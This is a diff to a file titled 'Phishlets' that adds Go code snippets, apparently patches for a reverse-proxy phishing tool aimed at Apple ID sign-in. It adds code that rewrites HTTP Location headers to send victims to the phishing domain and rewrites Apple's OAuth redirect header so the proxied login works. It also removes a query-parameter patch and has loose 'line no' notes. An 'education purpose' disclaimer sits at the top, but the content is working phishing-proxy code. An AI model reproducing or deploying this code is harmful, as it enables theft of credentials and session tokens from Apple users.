@@ -1,4 +1,5 @@
 # Phishlets
+Educational Purpose !
 This is only for Education Purpose not use for harming to anyone.
 
 				//Replace User Agent Header
@@ -9,21 +10,32 @@ This is only for Education Purpose not use for harming to anyone.
 
 				} 	
         
-        
-        
-        
-				// patch GET query params with original domains
-				if pl != nil {
-					qs := req.URL.Query()
-					if len(qs) > 0 {
-						for gp := range qs {
-							for i, v := range qs[gp] {
-								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-							if qs[gp][i] == "/appleauthhttps://idmsa.test.com/auth" { // https://idmsa.apple.com/appleauthhttps://idmsa.test.com/auth
-								qs[gp][i] = "/appleauth/auth" // https://idmsa.test.com/appleauth/auth
-							}
-							}
-						}
-						req.URL.RawQuery = qs.Encode()
+ line no 652 to 665      
+			// if "Location" header is present, make sure to redirect to the phishing domain
+			r_url, err := resp.Location()
+			if err == nil {
+				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
+					r_url.Host = r_host
+					loc := resp.Header.Get("Location")
+					if loc == "/auth" {
+						resp.Header.Set("Location","/auth")
+					} else {
+						resp.Header.Set("Location", r_url.String())
 					}
-				} 	        
+					
+				} 
+			}        
+        
+line no 408	
+				// fix apple request header 
+				ref := req.Header.Get("X-Apple-Oauth-Redirect-Uri")
+				if ref != "" {
+					if o_url, err := url.Parse(ref); err == nil {
+						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
+							o_url.Host = r_host
+							req.Header.Set("X-Apple-Oauth-Redirect-Uri", o_url.String())
+						}
+					}
+				}	
+			
+
